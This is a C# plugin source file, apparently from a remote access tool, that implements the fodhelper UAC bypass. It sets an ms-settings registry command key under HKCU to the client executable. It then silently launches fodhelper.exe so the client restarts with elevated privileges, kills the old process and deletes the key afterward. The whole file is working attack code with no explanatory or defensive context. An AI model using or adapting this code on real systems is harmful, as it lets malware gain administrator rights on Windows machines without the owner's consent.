using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using Microsoft.Win32;

namespace Plugin
{
    public class Plugin : MarshalByRefObject
    {
        public string Execute()
        {
            string response = "Restarting client with elevated privileges...";
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command");
            key.SetValue("", Process.GetCurrentProcess().MainModule.FileName);
            key.SetValue("DelegateExecute", "");
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c \"timeout /t 1 > nul & fodhelper.exe & TASKKILL /f /im Client.exe & exit\"";
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            Process myProcess = new Process();
            myProcess.StartInfo = psi;
            myProcess.Start();
            myProcess.WaitForExit();
            Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings\shell\open\command");
            return response;
        }
    }
}
